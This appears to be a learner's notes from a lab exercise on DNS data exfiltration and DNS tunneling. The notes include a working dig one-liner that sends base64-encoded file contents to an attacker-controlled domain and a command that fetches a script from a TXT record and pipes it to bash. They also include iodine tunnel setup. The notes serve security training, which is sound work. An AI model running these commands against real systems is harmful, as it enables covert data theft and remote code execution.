## Table of Contents

- [Behavioral Signatures](#behavioral\signatures)

To perform exfiltration via the DNS protocol. you need to control a domain name and set up DNS records, including NS, A, or TXT. 
Domain: tunnel.com

To access the website, visit: http://10.10.55.97/ or https://10-10-55-97.p.thmlabs.com/

The DNS protocol is a common protocol and its primary purpose is to resolve domain names to IP addresses and vice versa. Even through the DNS protocol is not designed to transfer data, threat actors found a way to abuse and move data through it. 

What is DNS Data Exfiltration?
DNS is not a transport protocol, many organizations dont regularly monitor the DNS protocol! The DNS protocol is allowed in almost all firewalls in any organization network. For those reasons, threat actors prefer using the DNS protocol to hide their communications. The dns protocol has limitations that need to be takin into consideration, which are as follow:
- The maximum length of the Fully Qualified (FQDN) domain name (inlcuding seperators) is 255 characters.
- The subdomain name (label) length must not exceed 63 characters (not including .com, .net, etc)

Next, from the victim2 machine, we send the base64 data as a subdomain name with considering the DNS limitation as follows:  

Send the Encoded data via the dig command  

```markup
thm@victim2:~$ cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash
```


to view the TXT record 
1. Confirm
```
thm@victim2$ dig +short -t TXT script.tunnel.com
```
2. decode the output from base64 adn execute the command within the script
```
thm@victim2$ dig +short -t TXT script.tunnel.com | tr -d "\"" | base64 -d | bash
```


**DNS Tunneling**

This technique is also known as TCP over DNS, where an attacker encapsulates other protocols, such as HTTP requests, over the DNS protocol using the DNS Data Exfiltration technique. DNS tunneling establishes a communication channel where data is sent and received continoutsly.

We will be using the [iodine](https://github.com/yarrick/iodine) tool for creating our DNS tunneling communications. Note that we have already installed [iodine](https://github.com/yarrick/iodine) on the JumpBox and Attacker machines. To establish DNS tunneling, we need to follow the following steps:

1. Ensure to update the DNS records and create new NS points to your AttackBox machine. or use the preconfigured nameserver, which points to the Attacker machine (att.tunnel.com=172.20.0.200) 
2. Run iodined server from attackbox or the attacker machine
3. 1. On JumpBox, run the iodine client to establish the connection. (note for the client side we use iodine - without **d)**
4. SSH to the machine on the created network interface to create a proxy over DNS. We will be using the -D argument to create a dynamic port forwarding.
5. Once an SSH connection is established, we can use the local IP and the local port as a proxy in Firefox or ProxyChains.
6. 

Let's follow the steps to create a DNS tunnel. First, let's run the server-side application (iodined) as follows,

Running iodined Server  

```markup
thm@attacker$ sudo iodined -f -c -P thmpass 10.1.1.1/24 att.tunnel.com                                                                                                                                                                     
Opened dns0
Setting IP of dns0 to 10.1.1.1
Setting MTU of dns0 to 1130
Opened IPv4 UDP socket
Listening to dns for domain att.tunnel.com
```

Let's explain the previous command a bit more:

- Ensure to execute the command with sudo. The iodined creates a new network interface (dns0) for the tunneling over the DNS.
- The -f argument is to run the server in the foreground.
- The -c argument is to skip checking the client IP address and port for each DNS request.
- The -P argument is to set a password for authentication.
-  The 10.1.1.1/24 argument is to set the network IP for the new network interface (dns0). The IP address of the server will be 10.1.1.1 and the client 10.1.1.2.
- att.tunnel.com is the nameserver we previously set.

**Wrapping Up**
Basic data exfiltration techniques/protocols:
- TCP Sockets
- SSH
- HTTP/HTTPS
- ICMP
- DNS

https://lots-project.com/

Data exfiltration is not limited to protocols and methods discusses above. The above link is a living off truster sites that could be used to exfiltrate data or C2 Communication using legitimate websites




# Behavioral Signatures

Obfuscating functions and properties can achieve a lot with minimal modification. 